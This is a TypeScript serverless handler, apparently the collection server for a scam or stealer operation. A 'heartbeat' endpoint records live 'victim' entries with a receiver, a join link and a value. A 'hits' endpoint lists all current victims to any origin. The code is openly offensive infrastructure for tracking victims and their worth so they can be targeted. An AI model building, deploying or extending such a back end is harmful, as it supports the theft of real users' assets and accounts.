import { VercelRequest, VercelResponse } from '@vercel/node';

const GLOBAL_CACHE = new Map<string, Map<string, any>>();

export default function handler(req: VercelRequest, res: VercelResponse) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();
    const url = req.url || "";    
    if (url.includes('heartbeat') && req.method === 'POST') {
        try {
            const { victim, receiver, joinLink, value } = req.body;
            if (!victim || !receiver) return res.status(400).json({ error: "Missing Data" });
            if (!GLOBAL_CACHE.has(receiver)) {
                GLOBAL_CACHE.set(receiver, new Map());
            }
            const receiverMap = GLOBAL_CACHE.get(receiver)!;
            receiverMap.set(victim, {
                victim,
                receiver,
                joinLink,
                value: value || 0,
                timestamp: Date.now()
            });
            const now = Date.now();
            for (const [vName, data] of receiverMap.entries()) {
                if (now - data.timestamp > 25000) {
                    receiverMap.delete(vName);
                }
            }

            return res.status(200).json({ status: "ok", cached: receiverMap.size });
        } catch (e) {
            return res.status(500).json({ error: "Server Error" });
        }
    }
    if (url.includes('hits') && req.method === 'GET') {
        try {
            let allVictims: any[] = [];
            
            const now = Date.now();
            for (const [receiverName, receiverMap] of GLOBAL_CACHE.entries()) {
                for (const [vName, data] of receiverMap.entries()) {
                    if (now - data.timestamp < 25000) {
                        allVictims.push(data);
                    } else {
                        receiverMap.delete(vName);
                    }
                }
            }
            return res.status(200).json(allVictims);
        } catch (e) {
            return res.status(500).json({ error: "Server Error" });
        }
    }
    return res.status(404).json({ error: "Endpoint Not Found" });
}
